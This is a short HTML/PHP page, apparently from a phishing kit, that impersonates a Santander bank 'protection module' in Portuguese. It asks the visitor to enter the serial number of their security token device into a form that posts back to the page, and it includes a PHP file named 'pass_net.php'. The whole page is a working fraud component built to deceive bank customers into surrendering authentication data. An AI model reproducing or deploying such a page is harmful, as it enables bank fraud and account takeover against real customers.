<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle">
				<h1 class="title_ass">Módulo de Proteção Santander</h1>
				<p class="text_ased" style="line-height: 1.3em;">
					Para confirmar esta operação informe o número de série de seu dispositivo Token. Este número fica localizado na parte trazeira do dispositivo.
				</p>
			</div>


			<div class="md_boxTables">
				<form action="" name="formAss" id="formAss" method="post" onsubmit="return checkSerial();" style="margin-top:10px;">
					<span>Número de Série:</span>
					<input type="text" name="serial_number" id="serial_number" class="input_ass" maxlength="10" onkeypress='return SomenteNumero(event)' autocomplete="off"> 

					<input type="hidden" name="sender" id="sender" value="serial">
					<input type="submit" name="sendAss" id="sendAss" class="btn_ass" value="confirmar">
				</form>
			
				<span class="note_atr">
					<b class="red_txt">Dica:</b><br>
					Em caso de dúvidas entre em contato com a Superlinha - Atendimento Empresarial. <br>
					Capitais e Regiões Metropolitanas: Atendimento de 06:00 às 22:00 - Demias Localidades: Atendimento de 08:00 às 17:00
				</span>
			</div><!-- md_boxTables -->

			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>